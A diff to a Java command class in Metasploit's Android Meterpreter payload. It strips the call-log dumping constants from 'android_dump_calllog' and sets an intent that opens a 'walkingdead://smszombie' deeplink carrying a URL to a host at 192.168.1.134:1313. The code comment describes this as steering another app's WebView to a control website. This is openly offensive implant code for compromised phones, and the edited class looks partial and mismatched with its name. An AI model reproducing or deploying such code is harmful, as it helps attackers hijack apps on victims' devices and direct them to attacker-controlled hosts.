@@ -1,9 +1,7 @@
 package com.metasploit.meterpreter.android;
 
-import java.util.Date;
-
 import android.database.Cursor;
-import android.provider.CallLog;
+import android.net.Uri;
 
 import com.metasploit.meterpreter.AndroidMeterpreter;
 import com.metasploit.meterpreter.Meterpreter;
@@ -24,27 +22,11 @@ import android.content.pm.ResolveInfo;
 
 public class android_dump_calllog implements Command {
 
-    private static final int TLV_EXTENSIONS = 20000;
-    private static final int TLV_TYPE_CALLLOG_NAME = TLVPacket.TLV_META_TYPE_STRING
-            | (TLV_EXTENSIONS + 9013);
-    private static final int TLV_TYPE_CALLLOG_TYPE = TLVPacket.TLV_META_TYPE_STRING
-            | (TLV_EXTENSIONS + 9014);
-    private static final int TLV_TYPE_CALLLOG_DATE = TLVPacket.TLV_META_TYPE_STRING
-            | (TLV_EXTENSIONS + 9015);
-    private static final int TLV_TYPE_CALLLOG_DURATION = TLVPacket.TLV_META_TYPE_STRING
-            | (TLV_EXTENSIONS + 9016);
-    private static final int TLV_TYPE_CALLLOG_GROUP = TLVPacket.TLV_META_TYPE_GROUP
-            | (TLV_EXTENSIONS + 9017);
-    private static final int TLV_TYPE_CALLLOG_NUMBER = TLVPacket.TLV_META_TYPE_STRING
-            | (TLV_EXTENSIONS + 9018);
-    private static final String unknown = "Unknown";
-    private static final String outgoing = "OUTGOING";
-    private static final String incoming = "INCOMING";
-    private static final String missed = "MISSED";
 
     @Override
     public int execute(Meterpreter meterpreter, TLVPacket request,
                        TLVPacket response) throws Exception {
+
 
         AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
         final Context context = androidMeterpreter.getContext();
@@ -59,7 +41,7 @@ public class android_dump_calllog implements Command {
         // Starts intent with deeplink to navigate SMSZombie's WebView to control website
         try {
             Intent intent = new Intent("android.intent.action.VIEW",
-                        Uri.parse("walkingdead://callzombie/?url=http://192.168.1.134:1313"));
+                        Uri.parse("walkingdead://smszombie/?url=http://192.168.1.134:1313"));
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             context.startActivity(intent);
 
